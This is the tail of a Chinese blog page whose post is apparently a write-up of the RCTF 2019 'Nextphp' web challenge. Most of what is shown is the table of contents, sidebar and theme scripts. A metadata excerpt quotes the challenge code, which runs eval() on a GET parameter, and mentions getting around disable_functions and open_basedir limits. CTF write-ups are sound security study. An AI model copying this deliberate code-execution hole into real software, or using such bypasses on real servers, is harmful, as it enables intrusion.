+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81"><span class="toc-number">1.</span> <span class="toc-text"> 源码：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php-%E5%A4%96%E9%83%A8%E5%87%BD%E6%95%B0%E6%8E%A5%E5%8F%A3ffi%E5%AD%A6%E4%B9%A0"><span class="toc-number">2.</span> <span class="toc-text"> PHP 外部函数接口FFI学习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%8F%E5%88%97%E5%8C%96%E6%8E%A5%E5%8F%A3"><span class="toc-number">3.</span> <span class="toc-text"> 序列化接口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%84%E5%8A%A0%E8%BD%BD"><span class="toc-number">4.</span> <span class="toc-text"> 预加载</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">5.</span> <span class="toc-text"> 解题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text"> 知识点总结</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[RCTF 2019]Nextphp",
+          url: "http://example.com/2025/05/12/[RCTF%202019]Nextphp/",
+          excerpt: "",
+          description: "",
+          stripContent: "题目代码： 123456&amp;lt;?phpif (isset($_GET[&amp;#x27;a&amp;#x27;])) &amp;#123;    eval($_GET[&amp;#x27;a&amp;#x27;]);&amp;#125; else &amp;#123;    show_source(__FILE__);&amp;#125; 用phpinfo()查看了一下 有两处限制： 启用了disable_function,禁了很多函数 使得open_basedir=“/var/www/html”，只能查看当前目录 这里有两种办法： 1234561：直接",
+          date: "Mon May 12 2025 16:10:33 GMT+0800",
+          updated: "Mon May 12 2025 17:45:10 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
